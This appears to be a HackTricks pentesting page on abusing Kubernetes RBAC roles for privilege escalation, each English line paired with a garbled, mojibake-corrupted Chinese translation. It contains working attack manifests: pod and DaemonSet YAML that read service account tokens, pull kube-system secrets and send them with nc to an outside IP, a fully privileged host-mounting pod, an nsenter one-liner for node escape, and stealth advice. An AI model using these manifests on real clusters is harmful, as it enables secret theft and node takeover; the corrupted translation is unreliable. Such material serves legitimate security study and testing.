# Abusing Roles/ClusterRoles in Kubernetes

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>æ”¯æŒhacktrickså¹¶è·å¾—å¥½å¤„ï¼</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æ˜¯å¦æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨hacktricks **ä¸­åˆŠç™»å¹¿å‘Šï¼Ÿ è¿˜æ˜¯æ‚¨æƒ³è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„è±Œè±†æˆ–åœ¨pdf **ä¸­ä¸‹è½½hacktricksï¼Ÿ æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**]ï¼ˆhttps://github.com/sponsors/carlospolopï¼‰ï¼

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - å‘ç°[**è±Œè±†å®¶åº­**]ï¼ˆhttps://opensea.io/collection/the-peass-familyï¼‰ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[** nfts **]ï¼ˆhttps://opensea.io/collectionï¼‰ /å®¶åº­å®¶åº­ï¼‰

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - è·å–[**å®˜æ–¹è±Œè±†å’Œhacktricksèµƒç‰©**]ï¼ˆhttps://peass.creator-spring.comï¼‰

- **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **åŠ å…¥** [**ğŸ’¬**]ï¼ˆhttps://emojipedia.org/speech-balloon/ï¼‰[** discord group **]ï¼ˆhttps://discord.gg/hrep4ruj7fï¼‰æˆ–[ **ç”µæŠ¥ç»„**]ï¼ˆhttps://t.me/peassï¼‰æˆ–**åœ¨** Twitter ** [**ğŸ¦**]ï¼ˆhttps://github.com/carloppolop/hacktrickss on ** twitter **ï¼‰ /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.mdï¼‰eardme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **é€šè¿‡å°†PRSæäº¤ç»™** [** hacktricks github repo **]ï¼ˆhttps://github.com/carloppolop/hacktricksï¼‰**ã€‚

</details>

Here you can find some potentially dangerous Roles and ClusterRoles configurations.\

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€äº›æ½œåœ¨çš„å±é™©è§’è‰²å’Œèšç±»é…ç½®ã€‚\ \
Remember that you can get all the supported resources with `kubectl api-resources`

è¯·è®°ä½ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨â€œ Kubectl Api-Resourcesâ€è·å¾—æ‰€æœ‰æ”¯æŒçš„èµ„æº

## **Privilege Escalation**

Referring as the art of getting **access to a different principal** within the cluster **with different privileges** (within the kubernetes cluster or to external clouds) than the ones you already have, in Kubernetes there are basically **4 main techniques to escalate privileges**:

å°†**è®¿é—®ä¸åŒç‰¹æƒ**ï¼ˆåœ¨kubernetesç¾¤é›†æˆ–å¤–éƒ¨äº‘ä¸­ï¼‰çš„è‰ºæœ¯ä¸æ‚¨å·²ç»æ‹¥æœ‰çš„å…¶ä»–ä¸»ä½“ç›¸æ¯”ï¼Œåœ¨kubernetesä¸­ï¼ŒåŸºæœ¬ä¸Šæœ‰** 4 å‡çº§ç‰¹æƒçš„ä¸»è¦æŠ€æœ¯**ï¼š

* Be able to **impersonate** other user/groups/SAs with better privileges within the kubernetes cluster or to external clouds

*èƒ½å¤Ÿ**æ¨¡ä»¿**å…¶ä»–ç”¨æˆ·/ç»„/SAï¼Œåœ¨Kubernetesç¾¤é›†æˆ–å¤–éƒ¨äº‘ä¸­å…·æœ‰æ›´å¥½çš„ç‰¹æƒ
* Be able to **create/patch/exec pods** where you can **find or attach SAs** with better privileges within the kubernetes cluster or to external clouds

*èƒ½å¤Ÿ**åˆ›å»º/patch/exec pods **æ‚¨å¯ä»¥**æ‰¾åˆ°æˆ–é™„åŠ SAS **ï¼Œåœ¨Kubernetesç¾¤é›†æˆ–å¤–éƒ¨äº‘ä¸­è·å¾—æ›´å¥½çš„ç‰¹æƒ
* Be able to **read secrets** as the SAs tokens are stored as secrets

*å¯ä»¥**é˜…è¯»ç§˜å¯†**ï¼Œå› ä¸ºSASä»¤ç‰Œè¢«å­˜å‚¨ä¸ºç§˜å¯†
* Be able to **escape to the node** from a container, where you can steal all the secrets of the containers running in the node, the credentials of the node, and the permissions of the node within the cloud it's running in (if any)

*èƒ½å¤Ÿ**é€ƒåˆ°èŠ‚ç‚¹**ä»å®¹å™¨ä¸­é€ƒåˆ°ä¸€ä¸ªå®¹å™¨ä¸­ï¼Œæ‚¨å¯ä»¥åœ¨å…¶ä¸­çªƒå–åœ¨èŠ‚ç‚¹ä¸­è¿è¡Œçš„å®¹å™¨çš„æ‰€æœ‰ç§˜å¯†ï¼ŒèŠ‚ç‚¹çš„å‡­æ®ä»¥åŠåœ¨äº‘ä¸­è¿è¡Œçš„èŠ‚ç‚¹çš„æƒé™ï¼ˆ å¦‚æœæœ‰ï¼‰
* A fifth technique that deserves a mention is the ability to **run port-forward** in a pod, as you may be able to access interesting resources within that pod.

*å€¼å¾—ä¸€æçš„ç¬¬äº”æŠ€æœ¯æ˜¯å¯ä»¥åœ¨PODä¸­**è¿è¡ŒPort-Forward **çš„èƒ½åŠ›ï¼Œå› ä¸ºæ‚¨å¯èƒ½èƒ½å¤Ÿè®¿é—®è¯¥è±†èšä¸­çš„æœ‰è¶£èµ„æºã€‚

### **Access Any Resource or Verb**

### **è®¿é—®ä»»ä½•èµ„æºæˆ–åŠ¨è¯**

This privilege provides access to **any resource with any verb**. It is the most substantial privilege that a user can get, especially if this privilege is also a â€œClusterRole.â€ If itâ€™s a â€œClusterRole,â€ than the user can access the resources of any namespace and own the cluster with that permission.

æœ¬ç‰¹æƒæä¾›äº†ä½¿ç”¨ä»»ä½•åŠ¨è¯**çš„ä»»ä½•èµ„æºçš„è®¿é—®æƒé™ã€‚ è¿™æ˜¯ç”¨æˆ·å¯ä»¥è·å¾—çš„æœ€é‡è¦çš„ç‰¹æƒï¼Œå°¤å…¶æ˜¯å¦‚æœæ­¤ç‰¹æƒä¹Ÿæ˜¯â€œé›†ç¾¤â€ã€‚ å¦‚æœæ˜¯â€œèšç±»â€ï¼Œåˆ™ç”¨æˆ·å¯ä»¥è®¿é—®ä»»ä½•åç§°ç©ºé—´çš„èµ„æºå¹¶åœ¨è¯¥è®¸å¯ä¸­æ‹¥æœ‰ç¾¤é›†ã€‚

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
```

### **Access Any Resource**

### **è®¿é—®ä»»ä½•èµ„æº**

Giving a user permission to **access any resource can be very risky**. But, **which verbs** allow access to these resources? Here are some dangerous RBAC permissions that can damage the whole cluster:

æˆäºˆç”¨æˆ·è®¸å¯**è®¿é—®ä»»ä½•èµ„æºå¯èƒ½éå¸¸æœ‰é£é™©**ã€‚ ä½†æ˜¯ï¼Œ**å“ªä¸ªåŠ¨è¯**å…è®¸è®¿é—®è¿™äº›èµ„æºï¼Ÿ ä»¥ä¸‹æ˜¯ä¸€äº›å±é™©çš„RBACæƒé™ï¼Œå¯èƒ½ä¼šæŸå®³æ•´ä¸ªé›†ç¾¤ï¼š

* **resources: \["\*"] verbs: \["create"]** â€“ This privilege can **create any resource** in the cluster, such as **pods**, roles, etc. An attacker might abuse it to **escalate privileges**. An example of this can be found in the **â€œPods Creationâ€ section**.

***èµ„æºï¼š\ [â€œ \*â€]åŠ¨è¯ï¼š\ [åˆ›å»ºâ€œâ€] **  - æ­¤ç‰¹æƒå¯ä»¥**åœ¨é›†ç¾¤ä¸­åˆ›å»ºä»»ä½•èµ„æº**ï¼Œä¾‹å¦‚** pods **ï¼Œè§’è‰²ç­‰ã€‚ æ”»å‡»è€…å¯èƒ½ä¼šæ»¥ç”¨å®ƒï¼Œä»¥å‡çº§ç‰¹æƒ**ã€‚ å¯ä»¥åœ¨**â€œ Pods Creationâ€éƒ¨åˆ†**ä¸­æ‰¾åˆ°ä¸€ä¸ªä¾‹å­ã€‚
* **resources: \["\*"] verbs: \["list"]** â€“ The ability to list any resource can be used to **leak other usersâ€™ secrets** and might make it easier to **escalate privileges**. An example of this is located in the **â€œListing secretsâ€ section.**

***èµ„æºï¼š\ [â€œ \*â€]åŠ¨è¯ï¼š\ [listâ€] **  - åˆ—å‡ºä»»ä½•èµ„æºçš„èƒ½åŠ›å¯ä»¥ç”¨æ¥**æ³„æ¼å…¶ä»–ç”¨æˆ·çš„ç§˜å¯†**ï¼Œå¹¶å¯èƒ½ä½¿**æ›´å®¹æ˜“** å‡çº§ç‰¹æƒ**ã€‚ ä¸€ä¸ªä¾‹å­ä½äº**â€œåˆ—è¡¨ç§˜å¯†â€éƒ¨åˆ†ä¸­ã€‚**
* **resources: \["\*"] verbs: \["get"]-** This privilege can be used to **get secrets from other service accounts**.

***èµ„æºï¼š\ [â€œ \*â€]åŠ¨è¯ï¼š\ [â€œ getâ€]  -  **æ­¤ç‰¹æƒå¯ç”¨äº**ä»å…¶ä»–æœåŠ¡å¸æˆ·è·å¾—ç§˜å¯†**ã€‚

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["create", "list", "get"]
```

### Pod Create - Steal Token

### pod create-çªƒå–ä»¤ç‰Œ

An attacker with permission to create a pod in the â€œkube-systemâ€ namespace can create cryptomining containers for example. Moreover, if there is a **service account with privileged permissions, by running a pod with that service the permissions can be abused to escalate privileges**.

å…·æœ‰æƒé™çš„æ”»å‡»è€…åœ¨â€œ Kube-Systemâ€åç§°ç©ºé—´ä¸­åˆ›å»ºPODå¯ä»¥åˆ›å»ºåŠ å¯†å®¹å™¨ã€‚ æ­¤å¤–ï¼Œå¦‚æœæœ‰ä¸€ä¸ªå¸¦æœ‰ç‰¹æƒæƒé™çš„æœåŠ¡å¸æˆ·ï¼Œåˆ™å¯ä»¥é€šè¿‡è¯¥æœåŠ¡è¿è¡ŒPODï¼Œåˆ™å¯ä»¥æ»¥ç”¨æƒé™ä»¥å‡çº§ç‰¹æƒ**ã€‚

![](<../../../.gitbook/assets/image (463).png>)

Here we have a default privileged account named _bootstrap-signer_ with permissions to list all secrets.

åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªåä¸º_bootstrap-signer_çš„é»˜è®¤ç‰¹æƒå¸æˆ·ï¼Œå¹¶å…·æœ‰åˆ—å‡ºæ‰€æœ‰ç§˜å¯†çš„æƒé™ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/rolebinding\_with\_cluster\_admin\_clusterrole-1024x545.png)

ï¼

The attacker can create a malicious pod that will use the privileged service. Then, abusing the service token, it will ex-filtrate the secrets:

æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ç§æ¶æ„PODï¼Œè¯¥PODå°†ä½¿ç”¨ç‰¹æƒæœåŠ¡ã€‚ ç„¶åï¼Œæ»¥ç”¨æœåŠ¡ä»¤ç‰Œï¼Œå®ƒå°†å‰ç­›é€‰ç§˜å¯†ï¼š

![](https://www.cyberark.com/wp-content/uploads/2018/12/pods\_yaml\_with\_autoamountServiceAccountToken-1024x345.png)

ï¼

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true
```

In the previous image note how the _bootstrap-signer service is used in_ `serviceAccountname`_._

åœ¨ä¸Šä¸€ä¸ªå›¾åƒä¸­ï¼Œè¯·æ³¨æ„å¦‚ä½•ä½¿ç”¨_bootstrap-signer Service in _`ServiceAccountName'_._

So just create the malicious pod and expect the secrets in port 6666:

å› æ­¤ï¼Œåªéœ€åˆ›å»ºæ¶æ„è±†èšï¼Œå¹¶æœŸå¾…æ¸¯å£6666ä¸­çš„ç§˜å¯†ï¼š

![](<../../../.gitbook/assets/image (464).png>)

### **Pod Create & Escape**

The following definition gives all the privileges a container can have:

ä»¥ä¸‹å®šä¹‰èµ‹äºˆå®¹å™¨å¯ä»¥æ‹¥æœ‰çš„æ‰€æœ‰ç‰¹æƒï¼š

* **Privileged access** (disabling protections and setting capabilities)

***ç‰¹æƒè®¿é—®**ï¼ˆç¦ç”¨ä¿æŠ¤å’Œè®¾ç½®åŠŸèƒ½ï¼‰
* **Disable namespaces hostIPC and hostPid** that can help to escalate privileges

***ç¦ç”¨åç§°ç©ºé—´hostipcå’Œhostpid **å¯ä»¥å¸®åŠ©å‡çº§ç‰¹æƒ
* **Disable hostNetwork** namespace, giving access to steal nodes cloud privileges and better access to networks

***ç¦ç”¨hostnetwork **åç§°ç©ºé—´ï¼Œè®¿é—®çªƒå–èŠ‚ç‚¹äº‘ç‰¹æƒå¹¶æ›´å¥½åœ°è®¿é—®ç½‘ç»œ
* **Mount hosts / inside the container**

***å®‰è£…ä¸»æœº /å®¹å™¨å†…éƒ¨**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: ubuntu
  labels:
    app: ubuntu
spec:
  # Uncomment and specify a specific node you want to debug
  # nodeName: <insert-node-name-here>
  containers:
  - image: ubuntu
    command:
      - "sleep"
      - "3600" # adjust this as needed -- use only as long as you need
    imagePullPolicy: IfNotPresent
    name: ubuntu
    securityContext:
      allowPrivilegeEscalation: true
      privileged: true
      #capabilities:
      #  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
      runAsUser: 0 # run as root (or any other user)
    volumeMounts:
    - mountPath: /host
      name: host-volume
  restartPolicy: Never # we want to be intentional about running this pod
  hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
  hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
  hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
  volumes:
  - name: host-volume
    hostPath:
      path: /
```
{% endcode %}

Create the pod with:

ç”¨ï¼š

```bash
kubectl --token $token create -f mount_root.yaml
```

One-liner from [this tweet](https://twitter.com/mauilion/status/1129468485480751104) and with some additions:

[this Tweet]ï¼ˆhttps://twitter.com/mauilion/status/1129468485480751104ï¼‰çš„å•çº¿æ’ä»¶ï¼ˆ

```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

Now that you can escape to the node check post-exploitation techniques in:

ç°åœ¨ï¼Œæ‚¨å¯ä»¥é€ƒè„±åˆ°èŠ‚ç‚¹æ£€æŸ¥åæ¢ç´¢åçš„æŠ€æœ¯ï¼š

{% content-ref url="../../../pentesting/pentesting-kubernetes/attacking-kubernetes-from-inside-a-pod.md" %}
[attacking-kubernetes-from-inside-a-pod.md](../../../pentesting/pentesting-kubernetes/attacking-kubernetes-from-inside-a-pod.md)
{% endcontent-ref %}

#### Stealth

####éšèº«

You probably want to be **stealthier**, in the following pages you can see what you would be able to access if you create a pod only enabling some of the mentioned privileges in the previous template:

æ‚¨å¯èƒ½æƒ³æˆä¸º**éšèº«**ï¼Œåœ¨ä»¥ä¸‹é¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°å¦‚æœåˆ›å»ºPODä»…å¯ç”¨äº†ä¸Šä¸€ä¸ªæ¨¡æ¿ä¸­æåˆ°çš„æŸäº›ç‰¹æƒï¼Œåˆ™å¯ä»¥çœ‹åˆ°å¯ä»¥è®¿é—®çš„å†…å®¹ï¼š

* [**Privileged + hostPID**](../../../linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/#privileged-+-hostpid)

*[**ç‰¹æƒ + hostpid **]ï¼ˆ../../../ linux-hardening/privilege-escalation/docker-breakout/docker-break-breakout-privilege-privilege-escalation-privilege-escalation/ï¼ƒprivilegilege- +  -  hostpidï¼‰
* [**Privileged only**](../../../linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/#privileged)

*[**å”¯ä¸€çš„**]ï¼ˆ../../../ linux-hardening/privilege-escalation/docker-breakout/docker-break-breakout-privilege-privilege-eScalation/ï¼ƒç‰¹æƒï¼‰
* [**hostPath**](../../../linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/#arbitrary-mounts)

*[**ä¸»æŒäºº**]ï¼ˆ../../../ linux-hardening/privilege-escalation/docker-breakout/docker-break-breakout-privilege-privilege-scalation/ï¼ƒnutyary mountsï¼‰
* [**hostPID**](../../../linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/#hostpid)

*[** hostpid **]ï¼ˆ../../../ linux-hardening/privilege-escalation/docker-breakout/docker-break-breakout-privilege-privilege-eScalation/ï¼ƒhostpidï¼‰
* [**hostNetwork**](../../../linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/#hostnetwork)

*[** hostnetwork **]ï¼ˆ../../../ linux-hardening/privilege-eScalation/docker-breakout/docker-breakout-privilege-privilege-eScalation/ï¼ƒhostnetworkï¼‰
* [**hostIPC**](../../../linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/#hostipc)

*[** hostipc **]ï¼ˆ../../../ linux-hardening/privilege-escalation/docker-breakout/docker-break-breakout-privilege-privilege-eScalation/ï¼ƒhostipcï¼‰

_You can find example of how to create/abuse the previous privileged pods configurations in_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)\_\_

æ‚¨å¯ä»¥åœ¨_ [_httpsï¼š//github.com/bishopfox/badpods_]ï¼ˆhttps://github.com/bishopfox/badpodsï¼‰ä¸­æ‰¾åˆ°å¦‚ä½•åˆ›å»º/æ»¥ç”¨ä»¥å‰çš„ç‰¹æƒPodsé…ç½®çš„ç¤ºä¾‹ã€‚

### Pod Create - Move to cloud

### podåˆ›å»º - ç§»è‡³äº‘

If you can **create** a **pod** (and optionally a **service account**) you might be able to **obtain privileges in cloud environment** by **assigning cloud roles to a pod or a service account** and then accessing it.\

å¦‚æœæ‚¨å¯ä»¥**åˆ›å»º** a ** pod **ï¼ˆå¹¶ä¸”å¯ä»¥é€‰æ‹©åœ°**æœåŠ¡å¸æˆ·**ï¼‰ï¼Œæ‚¨å¯ä»¥**é€šè¿‡**å°†äº‘è§’è‰²åˆ†é…ç»™PODæˆ–A æœåŠ¡å¸æˆ·**ç„¶åè®¿é—®å®ƒã€‚\ \
Moreover, if you can create a **pod with the host network namespace** you can **steal the IAM** role of the **node** instance.

æ­¤å¤–ï¼Œå¦‚æœæ‚¨å¯ä»¥ä½¿ç”¨ä¸»æœºç½‘ç»œåç§°ç©ºé—´åˆ›å»ºä¸€ä¸ª** podï¼Œåˆ™å¯ä»¥**çªƒå–** node **å®ä¾‹çš„iam **è§’è‰²ã€‚

For more information check:

æœ‰å…³æ›´å¤šä¿¡æ¯æ£€æŸ¥ï¼š

{% content-ref url="../kubernetes-access-to-other-clouds.md" %}

{ï¼…content-ref url =â€œ ../ kubernetes-access-to-other-clouds.mdâ€ï¼…}
[kubernetes-access-to-other-clouds.md](../kubernetes-access-to-other-clouds.md)

[kubernetes-access-to-other-clouds.md]ï¼ˆ../ kubernetes-access-cecess-to-phere-clouds.mdï¼‰
{% endcontent-ref %}

### **Create/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs**

### **åˆ›å»º/è¡¥ä¸éƒ¨ç½²ï¼ŒDaemonsetï¼ŒStatefulsetsï¼ŒReplicationControllersï¼ŒReplicasetsï¼ŒJobså’ŒCronjobs **

Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs are all privileges that allow the creation of different tasks in the cluster. Moreover, it's possible can use all of them to **develop pods and even create pods**. So it's possible to a**buse them to escalate privileges just like in the previous example.**

éƒ¨ç½²ï¼Œå®ˆæŠ¤ç¨‹åºï¼ŒçŠ¶æ€äººç¾¤ï¼Œå¤åˆ¶controllersï¼Œreplicasetsï¼Œä½œä¸šå’Œcronjobséƒ½æ˜¯å…è®¸åœ¨é›†ç¾¤ä¸­åˆ›å»ºä¸åŒä»»åŠ¡çš„ç‰¹æƒã€‚ æ­¤å¤–ï¼Œæœ‰å¯èƒ½ä½¿ç”¨æ‰€æœ‰è¿™äº›éƒ½å¯ä»¥**å¼€å‘è±†èšï¼Œç”šè‡³åˆ›å»ºè±†èš**ã€‚ å› æ­¤ï¼Œå¯ä»¥åƒä¸Šä¸€ä¸ªç¤ºä¾‹ä¸€æ ·ï¼Œå¯ä»¥åƒ**ä¸€æ ·å‡çº§ç‰¹æƒã€‚**

Suppose we have the **permission to create a Daemonset** and we create the following YAML file. This YAML file is configured to do the same steps we mentioned in the â€œcreate podsâ€ section.

å‡è®¾æˆ‘ä»¬æœ‰**åˆ›å»ºdaemonset **çš„æƒé™ï¼Œç„¶ååˆ›å»ºä»¥ä¸‹YAMLæ–‡ä»¶ã€‚ è¯¥YAMLæ–‡ä»¶é…ç½®ä¸ºæ‰§è¡Œä¸â€œåˆ›å»ºPODâ€éƒ¨åˆ†ä¸­æåˆ°çš„ç›¸åŒæ­¥éª¤ã€‚

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: alpine
  namespace: kube-system
spec:
  selector:
    matchLabels:
      name: alpine
  template:
    metadata:
      labels:
        name: alpine
    spec:
      serviceAccountName: bootstrap-signer
      automountServiceAccountToken: true
      hostNetwork: true
      containers:
      - name: alpine
        image: alpine
        command: ["/bin/sh"]
        args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
```

In line 6 you can find the object â€œspecâ€ and children objects such as â€œ**template**â€ in line 10. These objects hold the configuration for the task we wish to accomplish. Another thing to notice is the "**serviceAccountName**" in line 15 and the â€œ**containers**â€ object in line 18. This is the part that relates to creating our malicious container.

åœ¨ç¬¬6è¡Œä¸­ï¼Œæ‚¨å¯ä»¥åœ¨ç¬¬10è¡Œä¸­æ‰¾åˆ°å¯¹è±¡â€œè§„æ ¼â€å’Œå­©å­çš„å¯¹è±¡ï¼Œä¾‹å¦‚â€œ ** template **â€ã€‚è¿™äº›å¯¹è±¡ä¿ç•™äº†æˆ‘ä»¬å¸Œæœ›å®Œæˆçš„ä»»åŠ¡çš„é…ç½®ã€‚ è¦æ³¨æ„çš„å¦ä¸€ä»¶äº‹æ˜¯ç¬¬15è¡Œä¸­çš„â€œ ** serviceaccountname **â€å’Œç¬¬18è¡Œä¸­çš„â€œ **å®¹å™¨**â€å¯¹è±¡ã€‚è¿™æ˜¯ä¸åˆ›å»ºæˆ‘ä»¬çš„æ¶æ„å®¹å™¨æœ‰å…³çš„éƒ¨åˆ†ã€‚

Kubernetes API documentation indicates that the â€œ**PodTemplateSpec**â€ endpoint has the option to create containers. And, as you can see: **deployment,** **daemonsets, statefulsets, replicationcontrollers, replicasets, jobs and cronjobs can all be used to create pods**:

Kubernetes APIæ–‡æ¡£æŒ‡å‡ºâ€œ ** podtemplatespec **â€ç«¯ç‚¹å…·æœ‰åˆ›å»ºå®¹å™¨çš„é€‰é¡¹ã€‚ è€Œä¸”ï¼Œå¦‚æ‚¨æ‰€è§ï¼š**éƒ¨ç½²ï¼Œ** ** daemonsetï¼Œstatefulsetsï¼ŒReplicationControllersï¼ŒReplicasetsï¼ŒJobså’ŒCronjobséƒ½å¯ä»¥ç”¨äºåˆ›å»ºPods **ï¼š

![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-8.png)

**So, the privilege to create or update tasks can also be abused for privilege escalation in the cluster.**

**å› æ­¤ï¼Œåˆ›å»ºæˆ–æ›´æ–°ä»»åŠ¡çš„ç‰¹æƒä¹Ÿå¯ä»¥æ»¥ç”¨ä»¥åœ¨é›†ç¾¤ä¸­çš„ç‰¹æƒå‡çº§ã€‚**

### **Pods Exec**

**Pod exec** is an option in kubernetes used for **running commands in a shell inside a pod**. This privilege is meant for administrators who want to **access containers and run commands**. Itâ€™s just like creating a SSH session for the container.

** POD Exec **æ˜¯ç”¨äº**åœ¨Pod **å†…çš„å¤–å£³ä¸­è¿è¡Œå‘½ä»¤çš„Kubernetesä¸­çš„ä¸€ä¸ªé€‰é¡¹ã€‚ æ­¤ç‰¹æƒæ˜¯é’ˆå¯¹æƒ³è¦**è®¿é—®å®¹å™¨å¹¶è¿è¡Œå‘½ä»¤**çš„ç®¡ç†å‘˜çš„ã€‚ å°±åƒä¸ºå®¹å™¨åˆ›å»ºSSHä¼šè¯ä¸€æ ·ã€‚

If we have this privilege, we actually get the ability **to take control of all the pods**. In order to do that, we needs to use the following command:

å¦‚æœæˆ‘ä»¬æ‹¥æœ‰è¿™ç§ç‰¹æƒï¼Œæˆ‘ä»¬å®é™…ä¸Šå¯ä»¥æ§åˆ¶æ‰€æœ‰POD **ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```

Note that as you can get inside any pod, you can abuse other pods token just like in [**Pod Creation exploitation**](./#pod-creation) to try to escalate privileges.

è¯·æ³¨æ„ï¼Œç”±äºæ‚¨å¯ä»¥è¿›å…¥ä»»ä½•åŠèˆ±ï¼Œå› æ­¤æ‚¨å¯ä»¥åƒ[** Pod Creationå‰¥å‰Š**]ï¼ˆ./# pod-creationï¼‰ä¸€æ ·æ»¥ç”¨å…¶ä»–åŠèˆ±ä»¤ç‰Œï¼Œä»¥å°è¯•å‡çº§ç‰¹æƒã€‚

### port-forward

### Port-Forward

This permission allows to **forward one local port to one port in the specified pod**. This is meant to be able to debug applications running inside a pod easily, but an attacker might abuse it to get access to interesting (like DBs) or vulnerable applications (webs?) inside a pod:

æ­¤æƒé™å…è®¸å°†ä¸€ä¸ªæœ¬åœ°ç«¯å£è½¬å‘åˆ°æŒ‡å®šPOD **çš„ä¸€ä¸ªç«¯å£ã€‚ è¿™æœ¬æ¥å¯ä»¥è½»æ¾åœ°è°ƒè¯•è¿è¡Œåœ¨PODå†…éƒ¨çš„åº”ç”¨ç¨‹åºï¼Œä½†æ˜¯æ”»å‡»è€…å¯èƒ½ä¼šæ»¥ç”¨å®ƒä»¥è®¿é—®PODä¸­çš„æœ‰è¶£ï¼ˆä¾‹å¦‚DBSï¼‰æˆ–è„†å¼±çš„åº”ç”¨ç¨‹åºï¼ˆä¾‹å¦‚DBSï¼‰æˆ–è„†å¼±çš„åº”ç”¨ç¨‹åºï¼ˆç½‘ç»œï¼Ÿï¼‰ï¼š

```
kubectl port-forward pod/mypod 5000:5000
```

### **Hosts Writable /var/log/ Escape**

As [**indicated in this research**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)\*\*,\*\*If you can access or create a pod with the **hosts `/var/log/` directory mounted** on it, you can **escape from the container**.\

å¦‚[**åœ¨è¿™é¡¹ç ”ç©¶**]ï¼ˆhttps://jackleadford.github.io/containers/2020/03/06/pvpost.htmlï¼‰\*\*ï¼Œ\*\*å¦‚æœæ‚¨å¯ä»¥è®¿é—®æˆ–åˆ›å»ºä¸€ä¸ª å¸¦æœ‰**ä¸»æœº`/var/log/`ç›®å½•å·²å®‰è£…**çš„åŠèˆ±ï¼Œæ‚¨å¯ä»¥**ä»å®¹å™¨ä¸­é€ƒè„±**ã€‚
This is basically because the when the **Kube-API tries to get the logs** of a container (using `kubectl logs <pod>`), it **requests the `0.log`** file of the pod using the `/logs/` endpoint of the **Kubelet** service.\

è¿™åŸºæœ¬ä¸Šæ˜¯å› ä¸º** kube-apiè¯•å›¾è·å–å®¹å™¨çš„æ—¥å¿—**ï¼ˆä½¿ç”¨`kubectl logs <pod>`ï¼‰ï¼Œå®ƒ**è¯·æ±‚ä½¿ç”¨podçš„0.log file ** kubelet **æœåŠ¡çš„`/logs/`ç«¯ç‚¹ã€‚
